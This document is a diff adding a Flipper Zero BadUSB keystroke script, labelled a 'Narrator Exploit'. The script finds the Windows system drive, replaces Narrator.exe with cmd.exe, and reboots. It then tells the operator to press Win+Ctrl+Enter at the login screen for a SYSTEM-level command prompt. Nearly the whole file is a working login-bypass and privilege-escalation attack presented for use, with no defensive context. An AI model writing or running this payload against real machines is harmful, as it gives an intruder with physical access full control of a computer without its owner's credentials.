@@ -1,0 +1,147 @@
+REM ================================================================
+REM Flipper Zero BadUSB - Narrator Exploit (Robust Version)
+REM ================================================================
+
+DELAY 2000
+
+REM Create detection script
+STRING echo off
+ENTER
+DELAY 300
+
+STRING cls
+ENTER
+DELAY 300
+
+STRING echo [*] Detecting Windows system drive...
+ENTER
+DELAY 500
+
+REM Check multiple drives
+STRING for %%d in (C D E F) do (
+ENTER
+DELAY 300
+
+STRING if exist %%d:\Windows\System32\cmd.exe (
+ENTER
+DELAY 300
+
+STRING set SYSDRIVE=%%d
+ENTER
+DELAY 300
+
+STRING echo [+] Windows found on drive %%d:
+ENTER
+DELAY 300
+
+STRING goto :found
+ENTER
+DELAY 300
+
+STRING )
+ENTER
+DELAY 300
+
+STRING )
+ENTER
+DELAY 500
+
+STRING echo [-] Windows system drive not found!
+ENTER
+DELAY 300
+
+STRING pause
+ENTER
+DELAY 300
+
+STRING exit
+ENTER
+DELAY 300
+
+STRING :found
+ENTER
+DELAY 500
+
+REM Display found drive
+STRING echo.
+ENTER
+DELAY 300
+
+STRING echo [*] System Drive: %SYSDRIVE%:
+ENTER
+DELAY 300
+
+STRING echo [*] Windows Path: %SYSDRIVE%:\Windows\System32
+ENTER
+DELAY 500
+
+STRING echo.
+ENTER
+DELAY 300
+
+STRING pause
+ENTER
+DELAY 1000
+
+REM Backup phase
+STRING echo [*] Step 1/4: Backing up Narrator.exe...
+ENTER
+DELAY 300
+
+STRING copy %SYSDRIVE%:\Windows\System32\Narrator.exe %SYSDRIVE%:\Windows\System32\Narrator.bak
+ENTER
+DELAY 2000
+
+STRING if exist %SYSDRIVE%:\Windows\System32\Narrator.bak (echo [+] Backup successful) else (echo [-] Backup failed)
+ENTER
+DELAY 1000
+
+REM Replace phase
+STRING echo [*] Step 2/4: Replacing Narrator with cmd.exe...
+ENTER
+DELAY 300
+
+STRING copy /Y %SYSDRIVE%:\Windows\System32\cmd.exe %SYSDRIVE%:\Windows\System32\Narrator.exe
+ENTER
+DELAY 2000
+
+REM Verify phase
+STRING echo [*] Step 3/4: Verifying replacement...
+ENTER
+DELAY 300
+
+STRING dir %SYSDRIVE%:\Windows\System32\Narrator.*
+ENTER
+DELAY 2000
+
+REM Reboot phase
+STRING echo [*] Step 4/4: Rebooting system...
+ENTER
+DELAY 300
+
+STRING echo.
+ENTER
+DELAY 300
+
+STRING echo [!] NEXT STEPS:
+ENTER
+DELAY 300
+
+STRING echo [!] At login screen, press: Win + Ctrl + Enter
+ENTER
+DELAY 300
+
+STRING echo [!] CMD will open as SYSTEM
+ENTER
+DELAY 300
+
+STRING echo.
+ENTER
+DELAY 300
+
+STRING timeout /t 5
+ENTER
+DELAY 6000
+
+STRING wpeutil reboot
+ENTER
